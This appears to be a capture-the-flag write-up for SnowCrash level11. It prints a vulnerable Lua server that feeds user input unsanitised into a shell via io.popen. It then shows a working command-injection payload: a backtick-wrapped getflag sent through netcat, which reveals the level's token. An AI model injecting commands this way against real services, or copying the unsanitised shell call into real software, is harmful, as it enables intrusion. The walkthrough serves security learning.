For this level, we have a file "level11.lua" with the s(SUID) permission.

"level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end"

We can see that it is trying to create something like a server in the 127.0.0.1 with port 5151.
Inside the while loop, the client input is capture and store inside variable "l".
The program then will run a function "hash" on the "l" variable to check if the input is the same as "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0".

There is something that looks interesting inside the function "hash", we can see our familiar echo command inside this function.
It seems that "io.popen" is executing a system's command inside it's own shell, that's why the result of the echo does not shows up in our shell. Let's try to exploit this.

"level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
	[C]: in function 'assert'
	./level11.lua:3: in main chunk
	[C]: ?"

It seems that the program is already running. Let's use "netcat" to connect to this server and exploit the echo.

"level11@SnowCrash:~$ nc localhost 5151
Password: `getflag` > /tmp/exploit_level11
Erf nope..
level11@SnowCrash:~$ cat /tmp/exploit_level11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s"
